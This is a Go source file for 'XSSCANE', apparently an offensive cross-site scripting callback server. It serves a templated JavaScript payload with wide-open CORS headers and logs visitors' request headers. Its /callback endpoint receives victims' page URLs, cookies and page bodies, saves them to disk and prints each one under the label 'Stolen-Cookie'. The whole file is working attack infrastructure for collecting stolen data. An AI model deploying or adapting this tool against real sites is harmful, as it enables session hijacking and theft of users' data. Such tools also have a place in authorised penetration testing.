package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"text/template"
	"time"
)

var banner string = `
___    ___ ________   ________  ________  ________  ________   _______      
|\  \  /  /|\   ____\ |\   ____\|\   ____\|\   __  \|\   ___  \|\  ___ \     
\ \  \/  / | \  \___|_\ \  \___|\ \  \___|\ \  \|\  \ \  \\ \  \ \   __/|    
 \ \    / / \ \_____  \\ \_____  \ \  \    \ \   __  \ \  \\ \  \ \  \_|/__  
  /     \/   \|____|\  \\|____|\  \ \  \____\ \  \ \  \ \  \\ \  \ \  \_|\ \ 
 /  /\   \     ____\_\  \ ____\_\  \ \_______\ \__\ \__\ \__\\ \__\ \_______\
/__/ /\ __\   |\_________\\_________\|_______|\|__|\|__|\|__| \|__|\|_______|
|__|/ \|__|   \|_________\|_________|                          by @jackrendor`

type callBackStruct struct {
	Body   string `json:"body"`
	URL    string `json:"url"`
	Cookie string `json:"cookie"`
}

func rootHandler(w http.ResponseWriter, r *http.Request) {
	//http.CanonicalHeaderKey()
	w.Header().Add("Access-Control-Allow-Origin", "*")
	w.Header().Add("Access-Control-Allow-Credentials", "true")
	w.Header().Add("Access-Control-Allow-Headers", "*")

	fmt.Printf("\n\n  \u001b[30;102m[%s] Connected\u001b[0m\n", r.RemoteAddr)
	fmt.Printf("%s %s%s\n", r.Method, r.Host, r.RequestURI)
	for key, value := range r.Header {
		fmt.Printf("\u001b[93m%s\u001b[0m: \u001b[96m%s\u001b[0m\n", key, strings.Join(value, ", "))
	}
	body, bodyErr := io.ReadAll(r.Body)
	if bodyErr != nil {
		fmt.Println("Error reading body:", bodyErr.Error())
		return
	}
	fmt.Println("\u001b[96m" + string(body) + "\u001b[0m")
	if r.Method == "GET" {

	}
	tmpl, _ := template.ParseFiles("xsscane.js")
	tmpl.Execute(w, r.Host)
}

func callBackFromScript(w http.ResponseWriter, r *http.Request) {
	w.Header().Add("Access-Control-Allow-Origin", "*")
	w.Header().Add("Access-Control-Allow-Credentials", "true")
	w.Header().Add("Access-Control-Allow-Headers", "*")

	if r.Method != "POST" {
		return
	}
	fmt.Printf("  \u001b[30;102m[%s] Connected\u001b[0m\n", r.RemoteAddr)
	var jsonData callBackStruct

	if jsonErr := json.NewDecoder(r.Body).Decode(&jsonData); jsonErr != nil {
		log.Println("Decoding error in callBackFromScript:", jsonErr.Error())
		return
	}

	filename := fmt.Sprintf("%d.html", time.Now().UnixNano())
	os.Mkdir("./data", os.ModePerm)
	writeErr := os.WriteFile(
		"./data/"+filename,
		[]byte("URL: "+jsonData.URL+"\nCOOKIE: "+jsonData.Cookie+"\nBODY:\n"+jsonData.Body),
		0644,
	)

	if writeErr != nil {
		log.Println("Writing error in callBackFromScript:", writeErr.Error())
	}
	fmt.Printf("\u001b[93mX-Forwarded-For\u001b[0m: \u001b[96m%s\u001b[0m\n", strings.Join(r.Header.Values("X-Forwarded-For"), ", "))
	fmt.Printf("\u001b[93mStolen-Cookie\u001b[0m: \u001b[96m%s\u001b[0m\n", jsonData.Cookie)

}

func main() {
	var listeningVar string
	flag.StringVar(&listeningVar, "listen", "0.0.0.0:8000", "Listen address, default: 0.0.0.0:8000")
	flag.Parse()

	http.HandleFunc("/callback", callBackFromScript)
	http.HandleFunc("/", rootHandler)
	fmt.Printf("\u001b[36m%s\u001b[0m\n", banner)
	fmt.Println("\nListening on:", listeningVar)
	fmt.Println("-----------------")
	log.Println(http.ListenAndServe(listeningVar, nil))
}
